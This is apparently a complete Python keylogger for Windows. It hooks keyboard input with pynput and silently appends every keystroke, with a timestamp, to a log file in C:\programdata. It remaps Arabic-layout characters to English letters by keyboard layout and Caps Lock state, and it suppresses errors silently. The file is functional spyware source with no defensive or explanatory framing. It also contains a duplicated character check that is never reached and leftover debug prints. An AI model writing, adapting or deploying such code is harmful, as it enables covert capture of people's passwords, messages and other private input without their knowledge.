import ctypes
from pynput import keyboard
from datetime import datetime

try:
    now = datetime.now()
    now = now.strftime("%d-%m-%Y %H:%M:%S")


    filename = "C:\\programdata\\log.txt"

    file = open(filename, "a")

    file.write("\n" + now + "\n")
    file.close()
    file = open(filename, "a",encoding='utf-16')

    def get_capslock_state():
        hllDll = ctypes.WinDLL("User32.dll")
        VK_CAPSLOCK = 0x14
        return hllDll.GetKeyState(VK_CAPSLOCK)
    def onPress(key):

        def get_current_lang():
            user32 = ctypes.WinDLL('user32', use_last_error=True)
            curr_window = user32.GetForegroundWindow()
            thread_id = user32.GetWindowThreadProcessId(curr_window, 0)
            klid = user32.GetKeyboardLayout(thread_id)
            lid = klid & (2 ** 16 - 1)
            lid_hex = hex(lid)
            return  lid_hex
       # print(get_current_lang())

        file = open(filename, "a")
        stroke = str(key).replace("'", "")

        if str(key) == "Key.space":
            file.write(" ")
        elif str(key) == "'":
            file.write("'")
        elif str(key) == "Key.enter":
            file.write("\n")
        elif str(key) == "Key.esc":
            file.write(" ")
        elif str(key) == "Key.backspace":
            file.write("<bc>")
        elif str(key).startswith("Key"):
            file.write("")
        elif str(key) == "<96>":
            file.write("0")
        elif str(key) == "<97>":
            file.write("1")
        elif str(key) == "<98>":
            file.write("2")
        elif str(key) == "<99>":
            file.write("3")
        elif str(key) == "<100>":
            file.write("4")
        elif str(key) == "<101>":
            file.write("5")
        elif str(key) == "<102>":
            file.write("6")
        elif str(key) == "<103>":
            file.write("7")
        elif str(key) == "<104>":
            file.write("8")
        elif str(key) == "<105>":
            file.write("9")
        elif str(key) == "<110>":
            file.write(".")

        elif get_current_lang() == "0x409":
            try:
                if get_capslock_state() == 1 and int(ord(stroke)) > 64 and int(ord(stroke) < 123):
                    stroke = int(ord(stroke)) - 32
                    stroke = chr(stroke)
                    file.write(stroke)

                elif int(ord(stroke)) > 1568 and int(ord(stroke) < 1616):
                    if get_capslock_state() == 1 :
                        english_start = 65
                        if int(ord(stroke)) == 1588:
                            english_start = chr(english_start)
                            file.write(english_start)
                        elif int(ord(stroke)) == 1604:
                            english_start = chr(english_start + 1)
                            file.write(english_start)
                        elif int(ord(stroke)) == 1572:
                            english_start = chr(english_start + 2)
                            file.write(english_start)
                        elif int(ord(stroke)) == 1610:
                            english_start = chr(english_start + 3)
                            file.write(english_start)
                        elif int(ord(stroke)) == 1579:
                            english_start = chr(english_start + 4)
                            file.write(english_start)
                        elif int(ord(stroke)) == 1576:
                            english_start = chr(english_start + 5)
                            file.write(english_start)
                        elif int(ord(stroke)) == 1604:
                            english_start = chr(english_start + 6)
                            file.write(english_start)
                        elif int(ord(stroke)) == 1575:
                            english_start = chr(english_start + 7)
                            file.write(english_start)
                        elif int(ord(stroke)) == 1607:
                            english_start = chr(english_start + 8)
                            file.write(english_start)
                        elif int(ord(stroke)) == 1578:
                            english_start = chr(english_start + 9)
                            file.write(english_start)
                        elif int(ord(stroke)) == 1606:
                            english_start = chr(english_start + 10)
                            file.write(english_start)
                        elif int(ord(stroke)) == 1605:
                            english_start = chr(english_start + 11)
                            file.write(english_start)
                        elif int(ord(stroke)) == 1577:
                            english_start = chr(english_start + 12)
                            file.write(english_start)
                        elif int(ord(stroke)) == 1609:
                            english_start = chr(english_start + 13)
                            file.write(english_start)
                        elif int(ord(stroke)) == 1582:
                            english_start = chr(english_start + 14)
                            file.write(english_start)
                        elif int(ord(stroke)) == 1581:
                            english_start = chr(english_start + 15)
                            file.write(english_start)
                        elif int(ord(stroke)) == 1590:
                            english_start = chr(english_start + 16)
                            file.write(english_start)
                        elif int(ord(stroke)) == 1602:
                            english_start = chr(english_start + 17)
                            file.write(english_start)
                        elif int(ord(stroke)) == 1587:
                            english_start = chr(english_start + 18)
                            file.write(english_start)
                        elif int(ord(stroke)) == 1601:
                            english_start = chr(english_start + 19)
                            file.write(english_start)
                        elif int(ord(stroke)) == 1593:
                            english_start = chr(english_start + 20)
                            file.write(english_start)
                        elif int(ord(stroke)) == 1585:
                            english_start = chr(english_start + 21)
                            file.write(english_start)
                        elif int(ord(stroke)) == 1589:
                            english_start = chr(english_start + 22)
                            file.write(english_start)
                        elif int(ord(stroke)) == 1569:
                            english_start = chr(english_start + 23)
                            file.write(english_start)
                        elif int(ord(stroke)) == 1594:
                            english_start = chr(english_start + 24)
                            file.write(english_start)
                        elif int(ord(stroke)) == 1574:
                            english_start = chr(english_start + 25)
                            file.write(english_start)

                    else:
                        english_start = 65
                        if int(ord(stroke)) == 1588:
                            english_start = chr(english_start + 32)
                            file.write(english_start)
                        elif int(ord(stroke)) == 1604:
                            english_start = chr(english_start + 33)
                            file.write(english_start)
                        elif int(ord(stroke)) == 1572:
                            english_start = chr(english_start + 34)
                            file.write(english_start)
                        elif int(ord(stroke)) == 1610:
                            english_start = chr(english_start + 35)
                            file.write(english_start)
                        elif int(ord(stroke)) == 1579:
                            english_start = chr(english_start + 36)
                            file.write(english_start)
                        elif int(ord(stroke)) == 1576:
                            english_start = chr(english_start + 37)
                            file.write(english_start)
                        elif int(ord(stroke)) == 1604:
                            english_start = chr(english_start + 38)
                            file.write(english_start)
                        elif int(ord(stroke)) == 1575:
                            english_start = chr(english_start + 39)
                            file.write(english_start)
                        elif int(ord(stroke)) == 1607:
                            english_start = chr(english_start + 40)
                            file.write(english_start)
                        elif int(ord(stroke)) == 1578:
                            english_start = chr(english_start + 41)
                            file.write(english_start)
                        elif int(ord(stroke)) == 1606:
                            english_start = chr(english_start + 42)
                            file.write(english_start)
                        elif int(ord(stroke)) == 1605:
                            english_start = chr(english_start + 43)
                            file.write(english_start)
                        elif int(ord(stroke)) == 1577:
                            english_start = chr(english_start + 44)
                            file.write(english_start)
                        elif int(ord(stroke)) == 1609:
                            english_start = chr(english_start + 45)
                            file.write(english_start)
                        elif int(ord(stroke)) == 1582:
                            english_start = chr(english_start + 46)
                            file.write(english_start)
                        elif int(ord(stroke)) == 1581:
                            english_start = chr(english_start + 47)
                            file.write(english_start)
                        elif int(ord(stroke)) == 1590:
                            english_start = chr(english_start + 48)
                            file.write(english_start)
                        elif int(ord(stroke)) == 1602:
                            english_start = chr(english_start + 49)
                            file.write(english_start)
                        elif int(ord(stroke)) == 1587:
                            english_start = chr(english_start + 50)
                            file.write(english_start)
                        elif int(ord(stroke)) == 1601:
                            english_start = chr(english_start + 51)
                            file.write(english_start)
                        elif int(ord(stroke)) == 1593:
                            english_start = chr(english_start + 52)
                            file.write(english_start)
                        elif int(ord(stroke)) == 1585:
                            english_start = chr(english_start + 53)
                            file.write(english_start)
                        elif int(ord(stroke)) == 1589:
                            english_start = chr(english_start + 54)
                            file.write(english_start)
                        elif int(ord(stroke)) == 1569:
                            english_start = chr(english_start + 55)
                            file.write(english_start)
                        elif int(ord(stroke)) == 1594:
                            english_start = chr(english_start + 56)
                            file.write(english_start)
                        elif int(ord(stroke)) == 1574:
                            english_start = chr(english_start + 57)
                            file.write(english_start)
                        else:
                            if int(ord(stroke)) == 1614:
                                print("line 273")
                                file.write("Q")
                            elif int(ord(stroke)) == 1611:
                                print("line 276")
                                file.write("W")
                            elif int(ord(stroke)) == 1612:
                                print("line 279")
                                file.write("R")
                            elif int(ord(stroke)) == 1615:
                                print("line 282")
                                file.write("E")
                            else:
                                print("line 284")
                                print(int(ord(stroke)))
                else:
                    file.write(stroke)
            except Exception:
                print("Error")


        else:
            pass

    with keyboard.Listener(on_press=onPress) as listener:
        listener.join()
except Exception:
    print("")